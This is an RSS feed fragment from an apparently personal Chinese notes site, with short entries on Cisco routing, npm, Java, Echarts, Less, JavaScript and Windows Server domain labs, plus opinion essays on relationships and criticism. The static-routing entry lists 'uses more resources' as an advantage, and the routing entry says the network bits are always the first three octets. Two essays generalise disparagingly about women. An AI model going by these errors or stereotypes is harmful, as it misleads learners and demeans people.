      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E5%92%8C%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E7%9A%84%E4%BC%98%E7%BC%BA%E7%82%B9/</guid>
      <description>静态和动态路由的优缺点 静态路由的优点：  占用资源较多。 便于管理员了解路由。 易于配置。  静态路由的缺点：  配置和维护耗费时间。 配置容易出错，尤其对于大型网络。 需要管理员维护变化的路由信息。 不能随着网络的增长而扩展；维护会越来越麻烦。 需要完全了解整个网络的情况才能进行操作。  动态路由的优点  增加或删除网络时，管理员维护路由配置的工作量较少。 网络拓扑结构发生变化时，协议可以自动做出调整。 配置不容易出错。 扩展性好，网络增长时不会出现问题。  动态路由的缺点  需要占用路由器资源（CPU 时间、内存和链路带宽）。 管理员需要掌握更多的网络知识才能进行配置、验证和故障排除工作。  </description>
    </item>
    
    <item>
      <title>Cisco 配置 Rip V2</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE-rip-v2/</link>
      <pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE-rip-v2/</guid>
      <description>配置 Rip V2 配置 R1 enableconfigure terminalip route 0.0.0.0 0.0.0.0 s0/0/1router ripversion 2no auto-summarynetwork 192.168.1.0network 192.168.2.0passive-interface gig 0/0default-information originate 配置 R2 enableconf trouter ripversion 2no auto-summarynetwork 192.168.2.0network 192.168.3.0network 192.168.4.0passive-interface gig 0/0 配置 R3 enableconf trouter ripversion 2no auto-summarynetwork 192.168.4.0network 192.168.5.0passive-interface gig 0/0 </description>
    </item>
    
    <item>
      <title>Cisco 配置静态路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Fri, 03 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%85%8D%E7%BD%AE%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1/</guid>
      <description>配置静态路由 配置 R1 enableconfigure terminalip route 172.31.0.0 255.255.255.0 172.31.1.193ip route 172.31.1.196 255.255.255.252 172.31.1.193ip route 172.31.1.128 255.255.255.192 172.31.1.193 配置 R2 enableconfigure terminalip route 172.31.1.0 255.255.255.128 172.31.1.194ip route 172.31.1.0 255.255.255.192 172.31.1.198ip route 172.31.1.128 255.255.255.192 172.31.1.198 配置 R3 enableconfigure terminalip route 0.0.0.0 0.0.0.0 172.31.1.197 </description>
    </item>
    
    <item>
      <title>Cisco 路由</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E8%B7%AF%E7%94%B1/</link>
      <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E8%B7%AF%E7%94%B1/</guid>
      <description>路由 ipv6 unicast-routing 全局开启 IPV6 路由功能
show ip route static 显示该路由器路由表中的静态路由
其他概念 PC 的默认网关必须和路由器对应接口（比如 g0/0 和 g0/1）的 ip 地址相同。
路由表中没有目标 ip，要么丢弃 ip，要么发给默认网关
直连网络 指的是与当前路由器直接相链接的网络。
远程网络 对于一个路由器来说，除了直连网络之外的网络都是远程网络。
主机位和网络位 一个 IP 地址的网络位是该地址的前三位。
一个 IP 地址的主机位是该地址的第四位。
当一个 IP 地址的主机位全为 0 的时候，这个 IP 地址为网络地址
当一个 IP 地址的主机位全为 1 的时候，这个 IP 地址为广播地址
下一跳路由 仅指定下一个目标路由器的接口的 IP 地址，也叫递归静态路由
直连静态路由 仅指定当前路由器的送出接口的端口号
默认静态路由 指定下一跳 IP 地址或当前路由器送出接口
ip route 0.0.0.0 0.0.0.0 192.168.1.2ip route 0.0.0.0 0.0.0.0 s0/0/0 完全指定静态路由 指定下一跳 IP 地址和当前路由器送出接口，</description>
    </item>
    
    <item>
      <title>Cisco 静态路由故障排除</title>
      <link>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4/</link>
      <pubDate>Thu, 02 Dec 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/internet/cisco/%E9%9D%99%E6%80%81%E8%B7%AF%E7%94%B1%E6%95%85%E9%9A%9C%E6%8E%92%E9%99%A4/</guid>
      <description>配置 R2 进入全局模式
enableconfigure terminal 故障一 no ip route 172.31.1.0 255.255.255.128 172.31.1.198ip route 172.31.1.0 255.255.255.128 172.31.1.194 故障二 no ip route 172.31.1.128 255.255.255.192 172.31.1.194ip route 172.31.1.128 255.255.255.192 172.31.1.198 配置 R3 进入全局模式
enableconfigure terminal 故障三 ip route 172.31.1.0 255.255.255.128 172.31.1.197 </description>
    </item>
    
    <item>
      <title>npm</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/npm/</guid>
      <description>npm npm 是Node.js的开放式模块登记和管理系统，是Node.js包的标准发布平台，用于Node.js包的发布、传播、依赖控制。
npm 提供了命令行工具，可以方便地下载、安装、升级、删除包，也可以让你作为开发者发布并维护包。
NPM 官网
安装 安装 Node.js自带 npm，所以安装 Node.js</description>
    </item>
    
    <item>
      <title>为什么要使用 npm</title>
      <link>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8-npm-/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/packagemanager/npm/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8-npm-/</guid>
      <description>为什么要使用 npm 网上的 npm 教程主要都在讲怎么安装、配置和使用 npm，却不告诉新人「为什么要使用 npm」。今天我就来讲讲这个话题。
本文目标读者是「不太了解 npm 的新人」，大神您别看了，不然又说我啰嗦了 。
社区 程序员自古以来就有社区文化：
社区的意思是：拥有共同职业或兴趣的人们，自发组织在一起，通过分享信息和资源进行合作。
虚拟社区的参与者经常会在线讨论相关话题，或访问某些网站。
前端程序员也有社区，世界上最大的前端社区应该就是 GitHub 了。
前端通过 GitHub ：
 分享源代码（线上代码仓库） 讨论问题（Issue 列表） 收集学习资源和常去的网站（比如我收集的优质中文前端博客）  加入社区最大的好处之一是，你可以使用别人贡献的代码，你也可以贡献代码给别人用。
共享代码 前端是怎么共享代码的呢？
在 GitHub 还没有兴起的年代，前端是通过网址来共享代码
比如你想使用 jQuery，那么你点击 jQuery 网站上提供的链接就可以下载 jQuery，放到自己的网站上使用
GItHub 兴起之后，社区中也有人使用 GitHub 的下载功能，但这很麻烦。
比如，当一个网站依赖的代码越来越多，程序员们发现这是一件很麻烦的事情：
去 jQuery 官网下载 jQuery。
去 BootStrap 官网下载 BootStrap。
去 Underscore 官网下载 Underscore。 ……
有些程序员就受不鸟了，一个拥有三大美德的程序员 Isaac Z. Schlueter （以下简称 Isaaz）给出一个解决方案：
用一个工具把这些代码集中到一起来管理吧。
这个工具就是他用 JavaScript （运行在 Node.js 上）写的 npm，全称是 Node Package Manager。</description>
    </item>
    
    <item>
      <title>挑剔是一种控制人的手段</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E6%8C%91%E5%89%94%E6%98%AF%E4%B8%80%E7%A7%8D%E6%8E%A7%E5%88%B6%E4%BA%BA%E7%9A%84%E6%89%8B%E6%AE%B5/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E6%8C%91%E5%89%94%E6%98%AF%E4%B8%80%E7%A7%8D%E6%8E%A7%E5%88%B6%E4%BA%BA%E7%9A%84%E6%89%8B%E6%AE%B5/</guid>
      <description>挑剔是一种控制人的手段 挑剔衣服的质量，可以得到更便宜的价格。
挑剔员工的工作，可以得到更好的品质。
女人对男人的挑剔是无处不在的。
什么碗没洗干净啦，什么鞋子没放好啦，什么房间乱七八糟啦……
都是些小事，但通过这些小事可以让你明白，
不管你在外面多么人模狗样的，在家这一亩三分地，你不行，你得听我的。</description>
    </item>
    
    <item>
      <title>男女之间最大的矛盾</title>
      <link>https://note.yxzi.xyz/note/view/bisexual/%E7%94%B7%E5%A5%B3%E4%B9%8B%E9%97%B4%E6%9C%80%E5%A4%A7%E7%9A%84%E7%9F%9B%E7%9B%BE/</link>
      <pubDate>Sun, 21 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/bisexual/%E7%94%B7%E5%A5%B3%E4%B9%8B%E9%97%B4%E6%9C%80%E5%A4%A7%E7%9A%84%E7%9F%9B%E7%9B%BE/</guid>
      <description>男女之间最大的矛盾 男女之间最大的矛盾在于：
一方面，女人想找一个各方面能力比自己强的男人；另一方面，又想要这个男人事事都顺着自己。
这就出现了一个难题：
一个能力弱的人如何管理一个能力强的人？
这几乎是不可能的。
你跑去跟老板说，我能力弱，所以你得听我的，这可能吗？
但如果你说，你儿子在我手上，那情况就不一样了。
所以，在男女关系中，女人一般是不讲道理的，也没法讲道理。
就拿女人管钱这事来说，有什么道理可言？是女人更勤俭持家，还是更懂得投资理财啊，显然都不是。
所以，最后她们只能通过，「爱我就把工资给我」，「我身边的朋友都是老婆管钱的，」这种诉诸情感，诉诸例子的方式来实现的。</description>
    </item>
    
    <item>
      <title>Java 字符流和字节流</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E5%AD%97%E7%AC%A6%E6%B5%81%E5%92%8C%E5%AD%97%E8%8A%82%E6%B5%81/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E5%AD%97%E7%AC%A6%E6%B5%81%E5%92%8C%E5%AD%97%E8%8A%82%E6%B5%81/</guid>
      <description>字节流 package yxzi.xyz;  import java.io.File; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.FileReader;  public class Rainy {  public static void main(String[] args) throws Exception {  File file = new File(&amp;#34;C:\\Users\\admin\\Desktop\\java\\File.txt&amp;#34;); // 字节输入流  FileInputStream wj = new FileInputStream(file);  // 字节输出流  FileOutputStream outinput = new FileOutputStream(&amp;#34;C:\\Users\\admin\\Desktop\\java\\副本.txt&amp;#34;);  // 创建一个字符数组---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------  byte arr[] = new byte[1024];  int len = wj.read(arr);  while (len != -1) { // String data = new String(arr); //// System.</description>
    </item>
    
    <item>
      <title>Java 遍历集合</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88/</link>
      <pubDate>Sat, 20 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/%E9%81%8D%E5%8E%86%E9%9B%86%E5%90%88/</guid>
      <description>遍历集合 package Yxzi;  import java.util.ArrayList; import java.util.HashMap; import java.util.Iterator;  public class Test {  public static void main(String[] args) throws Exception {  ArrayList &amp;lt;Student&amp;gt; arr = new ArrayList();   Student obj1 = new Student(&amp;#34;小明&amp;#34;, 23);  Student obj2 = new Student(&amp;#34;小红&amp;#34;, 18);  Student obj3 = new Student(&amp;#34;小花&amp;#34;, 13);  Student obj4 = new Student(&amp;#34;小黑&amp;#34;, 11);  Student obj5 = new Student(&amp;#34;小白&amp;#34;, 23);   arr.add(obj1);  arr.</description>
    </item>
    
    <item>
      <title>Echarts 文字样式</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</link>
      <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%96%87%E5%AD%97%E6%A0%B7%E5%BC%8F/</guid>
      <description>文字样式 fontSize: 11, color: &amp;#34;#eee&amp;#34;, textShadowColor: &amp;#34;rgba(0, 0, 0, 1)&amp;#34;, textShadowBlur: 10, textShadowOffsetX: 1, textShadowOffsetY: 1, 图形样式 barBorderRadius: 2, shadowColor: &amp;#34;rgba(0, 0 0, 0.3)&amp;#34;, shadowBlur: 3, shadowOffsetX: 1, shadowOffsetY: 1, </description>
    </item>
    
    <item>
      <title>快速使用 Echarts</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</link>
      <pubDate>Sat, 13 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8/</guid>
      <description>快速使用 Echarts // 快速使用 Echcarts (function () { 	// 1. 实例化对象 	var myChart = echarts.init(document.querySelector(&amp;#39;&amp;#39;)); 	// 2.配置  	// 3. 把配置给实例对象 	myChart.setOption(option); 	// 4. 让图表跟随屏幕自动的去适应 	window.addEventListener(&amp;#39;resize&amp;#39;, function () { 	myChart.resize(); 	}); })(); </description>
    </item>
    
    <item>
      <title>练字技巧</title>
      <link>https://note.yxzi.xyz/note/technology/writing/%E7%BB%83%E5%AD%97%E6%8A%80%E5%B7%A7/</link>
      <pubDate>Fri, 12 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/writing/%E7%BB%83%E5%AD%97%E6%8A%80%E5%B7%A7/</guid>
      <description>练字技巧 同字不同书，笔画都是有变化的
练字期间使用米子格或田字格的纸，不能脱离格子，因为格子是规范，是辅助线
临帖
仔细观察原帖的辅助线
起笔——运笔-收笔</description>
    </item>
    
    <item>
      <title>Echarts 遇到的错误</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</link>
      <pubDate>Sat, 06 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</guid>
      <description>遇到的错误 今天使用 Echarts 绘制地图时，浏览器控制台出现以下错误：
Uncaught DOMException: Failed to execute &amp;#39;drawImage&amp;#39; on &amp;#39;CanvasRenderingContext2D&amp;#39;: The image argument is a canvas element with a width or height of 0. 如何解决
只需要给需要被绘制的元素设置width和height Css 属性即可。</description>
    </item>
    
    <item>
      <title>Echarts 地图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</guid>
      <description>地图 常用配置 地图样式 配置 option —&amp;gt; geo —&amp;gt; itemStyle 下的normal .
normal: {  //面积区域颜色  areaColor: &amp;#34;#008C8C&amp;#34;,  // 区域分界线颜色  borderColor: &amp;#34;rgba(43, 196, 243, 1)&amp;#34;,  //区域分界线  borderWidth: 1 }, </description>
    </item>
    
    <item>
      <title>Less &amp; 使用</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/-%E7%AC%A6%E5%8F%B7/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/-%E7%AC%A6%E5%8F%B7/</guid>
      <description>Less &amp;amp; 使用 在类前面添加了&amp;amp;之后，编译之后的 css 变为且的关系，而没有使用&amp;amp;的 css 是父子的关系
&amp;amp; 符号可以表示对父选择器的引用。 在一个内层选择器的前面，如果没有 &amp;amp; 符号，则这个内层选择器会被解析为父选择器的后代。
如果内层选择器前面有一个 &amp;amp; 符号，则内层选择器会被解析为父选择器自身或父选择器的伪类。
Less 代码 .mainbox {display: flex;min-width: 1024px;max-width: 1920px;margin: 0 auto;padding: 0.125rem 0 0.125rem 0;.column {background-color: yellowgreen;flex: 3;&amp;amp;:nth-child(2) {flex: 5;}}} 解析后的 Css 代码 .mainbox .column:nth-child(2) { 	flex: 5; } 去掉 &amp;amp; 后的 Css 代码 .mainbox .column :nth-child(2) { 	flex: 5; } </description>
    </item>
    
    <item>
      <title>Less 嵌套</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E5%B5%8C%E5%A5%97/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E5%B5%8C%E5%A5%97/</guid>
      <description>嵌套 #header { 	color: black; } #header .navigation { 	font-size: 12px; } #header .logo { 	width: 300px; } 用 less 可以这样书写：
#header {color: black;.navigation {font-size: 12px;}.logo {width: 300px;}} &amp;amp; 在选择器前面添加了 &amp;amp; ，表示与父元素是并且关系，而没有使用&amp;amp;的 css 是父子的关系。
&amp;amp; 符号可以表示对父选择器的引用。 在一个内层选择器的前面，如果没有&amp;amp;符号，则这个内层选择器会被编译为父选择器的后代。
如果内层选择器到前面有一个&amp;amp;符号，则内层选择器会被编译为父选择器自身或父选择器的伪类、伪元素等。
div {width: 100px;height: 100px;background-color: firebrick;.indiv {width: 50px;height: 50px;background-color: salmon;&amp;amp;:hover {background-color: aquamarine;}}} 被编译为：</description>
    </item>
    
    <item>
      <title>Less 混合</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/less/%E6%B7%B7%E5%90%88/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/less/%E6%B7%B7%E5%90%88/</guid>
      <description>混合 将一个包含一组属性的规则集引入到另一个规则集的方式。
普通混合 当 less 编译成 css，混合规则集也会被编译到 css 中。这会导致 css 文件过大。
// .MixColor 会被编译到 css 文件中.MixColor {width: 100px;height: 100px;background-color: #008c8c;}.wrap {width: 200px;height: 200px;background-color: firebrick;.indiv {.MixColor;}.indiv2 {.MixColor;}} 为混合规则集加上()，则混合规则集不会被编译到 css 中。
//.MixColor 会被编译到 css 文件中.MixColor() {width: 100px;height: 100px;background-color: #008c8c;}.wrap {width: 200px;height: 200px;background-color: firebrick;.indiv {.MixColor;}.</description>
    </item>
    
    <item>
      <title>域服务器</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/win-server-%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8/</link>
      <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/win-server-%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8/</guid>
      <description>域服务器 父域一
父域二
子域三
成员四
9 月 30 号 vmware
One
大规模联网用域
小规模联网用组
更大的规模用林
打开 one，和 two，three，fou
更改计算机属性 - 重命名计算机名
设置密码和用户名
设置 ipv4 属性
One
ip 192.168.10.1，255.255.255.0，192.168.10.1
Dns 127.0.0.1，变为 192.168.10.1
Two
ip 地址 192.168.10.2，255.255.255.0，192.168.10.1
Dns 192.168.10.1 变为 192.168.10.2 备用 dns 192.168.10.1
Three
ip 192.168.10.3，255.255.255.0，192.168.10.1
Dns 192.168.10.1
Four
ip 192.168.10.4，255.255.255.0，192.168.10.1
Dns 192.168.10.1
选择 one
服务器管理 - 添加角色 - 服务器角色
勾选 dns 服务器 和 active directory 服务，安装完成后重启
管理工具
本地安全策略 账户策略 密码策略 密码必须符合复杂性要求 禁用</description>
    </item>
    
    <item>
      <title>Echarts 折线图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</guid>
      <description>Echarts 折线图 图表类型 在series下配置type.
type: &amp;#39;line&amp;#39;, 常用配置 标注图表区域 标记图表中某个范围的数据。
在series下配置markArea
markArea: {  data: [  [  {  xAxis: &amp;#39;李宁&amp;#39;  },  {  xAxis: &amp;#39;安踏&amp;#39;  }  ],  [  {  xAxis: &amp;#39;耐克&amp;#39;   },  {  xAxis: &amp;#39;阿迪&amp;#39;  }  ],  ], }, 线条是否平滑显示 在series下配置smooth
smooth: true, 线条样式 在series下配置lineStyle
lineStyle: {  color: &amp;#39;red&amp;#39;,  type: &amp;#39;dashed&amp;#39; } 线条区域样式 在series下配置areaStyle</description>
    </item>
    
    <item>
      <title>Echarts 柱状图</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</guid>
      <description>Echarts 柱状图 特点 柱状图描述的是分类数据，呈现的是每一个分类中有多少，
通过柱状图，可以很清晰的看出每个分类数据的排名情况。
基本结构 引入 echarts.js 文件, DOM 容器，初始化对象，设置 option。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); var xArr = [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;耐克&amp;#39;] var yArr = [30, 25, 55] var option = {  title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  link: &amp;#39;https://yxzi.xyz/&amp;#39;  }, }; myChart.setOption(option) X 轴数据 在option下配置 X 轴类型和数据。
xAxis: {  type: &amp;#39;category&amp;#39;,  data: xArr }, Y 轴数据 在option下配置 Y 轴的类型。
yAxis: {  type: &amp;#39;value&amp;#39;, }, 图表类型 在series下配置type.</description>
    </item>
    
    <item>
      <title>Echarts 通用配置</title>
      <link>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sat, 30 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</guid>
      <description>Echarts 通用配置 title 图表的标题。
标题的样式 在title下配置textStyle、
textStyle: {  color: &amp;#39;#008c8c&amp;#39;, }, 标题的边框 在title下配置：
borderWidth: 5, borderColor: &amp;#39;#008c8c&amp;#39;, borderRadius: 3, 标题的位置 在title下配置：
left: 10, top: 20, tooltip 提示框组件
用于配置鼠标滑过或点击图表时的提示框。
显示框的触发范围 在tooltip下配置trigger
trigger: &amp;#39;axis&amp;#39;, 显示框触发方式 在tooltip下配置triggerOn
triggerOn: &amp;#39;click &amp;#39;, 自定义提示框内容 字符串模板
formatter: &amp;#39;{b} 的科技水平是 {c}&amp;#39; 回调函数
formatter: function (arg) {  return arg[0].name + &amp;#39;的运动科技水平是&amp;#39; + arg[0].data } toolbox 图表的工具栏。
打开工具栏配置项 feature: { } 导出图片 以图片的形式导出图表
saveAsImage: {}, 数据视图工具 可以展现当前图表所用的数据，编辑后可以动态更新。
dataView: {}, 还原所有配置项 restore: {}, 数据区域的缩放 dataZoom: {}, 图表类型的动态切换 magicType: { 	type: [&amp;#39;bar&amp;#39;, &amp;#39;line&amp;#39;]; } legend 图表的图例组件。它展现了不同系列所对应不同的颜色和名字。可以通过点击某个图例来控制对应的系列显示与否。</description>
    </item>
    
    <item>
      <title>域服务器的基本操作</title>
      <link>https://note.yxzi.xyz/note/technology/windows-server/%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</link>
      <pubDate>Fri, 29 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/windows-server/%E5%9F%9F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</guid>
      <description>域服务器的基本操作 克隆 2008
打开 ad 01
新建用户
点击新建的用户
隶属于
添加一个
将 2012 升级为域控
添加一个子用户，但无法使用这个用户名登录域服务器
设置
192.168.1.1
255.255.255.0
网关 192.168.1.1
配置 2008
控制面板
网络链接
设置 ip
192.168.1.50
255.255.255.0
192.168.1.1
192.168.1.1
更改计算机名字
加入域
yxzi\user02（2012 域控上添加的用户）
在 2008 上面用 user02 这个用户名登录到域控
打开 ad 01
user 02 属性
账户，登录时间
新建 用户 user03
选择 user03 属性
配置登录名和密码
指定计算机才能登录
登录到，输入 ad 02 的计算机名
ad1 新建组 ts01
添加到组，选择 user02
选择 user03，隶属于，
ts 属性 用户，即可看到
新建 组织单位 danwei</description>
    </item>
    
    <item>
      <title>JavaScrip const</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/const/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/const/</guid>
      <description>const 声明一个常量（一旦声明就无法被修改的量）。
声明时必须赋初始值，声明时使用大写。
常量无法被修改。
块级作用域。
使用const声明的对象和数组，可以修改其属性或元素，因为常量所指向的引用地址并没有改变。</description>
    </item>
    
    <item>
      <title>JavaScrip var、let、count</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</guid>
      <description>var、let、count 使用var声明的变量，其作用域为该语句所在的函数内，且存在变量提升现象；
使用let声明的变量，其作用域为该语句所在的代码块内，不存在变量提升；
使用const声明的是常量，在后面出现的代码中不能再修改该常量的值。</description>
    </item>
    
    <item>
      <title>JavaScrip 结构赋值</title>
      <link>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/javascrip/%E8%AF%AD%E5%8F%A5/%E8%A7%A3%E6%9E%84%E8%B5%8B%E5%80%BC/</guid>
      <description>结构赋值 结构赋值就是从数组和对象中提取自己想要的变量，然后进行赋值。
数组 将数组中的元素，依次赋给变量。
const arr = [&amp;#39;1&amp;#39;, &amp;#39;2&amp;#39;, &amp;#39;3&amp;#39;, &amp;#39;4&amp;#39;]; let [a, b, c, d] = arr; console.log(a); console.log(b); console.log(c); console.log(d); 对象 将对象中的属性或方法依次赋给变量。
const obj = { 	name: &amp;#39;rainy&amp;#39;, 	age: 21, 	fun() { 	console.log(&amp;#39;method called&amp;#39;); 	}, };  let { name, age, fun } = obj; console.log(name); console.log(age); fun(); </description>
    </item>
    
    <item>
      <title>为什么人们不喜欢被批评</title>
      <link>https://note.yxzi.xyz/note/view/gam/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%BA%E4%BB%AC%E4%B8%8D%E5%96%9C%E6%AC%A2%E8%A2%AB%E6%89%B9%E8%AF%84/</link>
      <pubDate>Thu, 28 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/gam/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BA%BA%E4%BB%AC%E4%B8%8D%E5%96%9C%E6%AC%A2%E8%A2%AB%E6%89%B9%E8%AF%84/</guid>
      <description>为什么人们不喜欢被批评 这不是剂量问题，这是性质问题。
批评有一条细细的、意识几乎难以觉察、人常常不愿接受的红线：
批评只能给逻辑、给疑问、给论证，不可以讽刺，不可以定罪，更不可以用作构陷的工具。
比如：
有人给车换轮胎没放好千斤顶。
“换胎必须先把千斤顶放好，否则会 xxx”、“放好千斤顶的标准是 xxxx，你这样做在 x 个方面不达标，这会违反合同”。
这是批评。
“修车都不放好千斤顶，你真是蠢到家了”
“你哪个师傅教的？”
“你是不是说明书都看不懂？”
这就不是批评，而是借批评为名的攻击和侮辱。
“你不放好千斤顶是不是想制造事故压死修车工？”
这是入人以罪。
面向大众拿大喇叭广播——“ta 不放好千斤顶就是为了制造事故压死人”
这是构陷。
很多人把批评分为“善意批评”和“恶意批评”，这个说法本身其实是错的。
批评必须也只能是善意的。
没有善意，哪怕一个脏词都不带，扯尽了天下正义大旗，本质亦为迫害。
侮辱、入罪、构陷，都是化妆成批评，利用了人们不得不对批评给予的宽容而得逞的恶行。
心里就没有这些界限意识的人，根本做不到有效批评。
人不是不欢迎批评，而是批评是一门高度复杂和敏感，有无数红线，需要极强的原则性、高度自我克制、清醒的动机自觉的技能。
绝大多数人所以为是批评并且本能厌恶和抗拒的东西，其实根本就不是批评，只是乔装打扮、深深寄生在人的恶意本能中的迫害。
一个真正懂得批评是什么的人，可以用批评造就常人难以想象的杰出人物，可以成就照耀后人的伟业。
这些批评是贵如黄金，甚至可遇而不可求的。
求之且不得，何谈厌恶？
批评的法则的确也是一个很要害的问题。这种能力学好了、用好了，的确是一种强大的白魔法，
首先我们谈批评的标准操作。
第一步，是要分析自己的批评冲动本身。
你想要这个批评造成哪些净改变？
你要把这些诉求全面的列出来，确保这些诉求是批评所可以达到的、可以合法追求的结果。
一般来说，人们通过名为批评的行为要达到的几种典型的诉求包括：
  补偿自己的不满情绪。
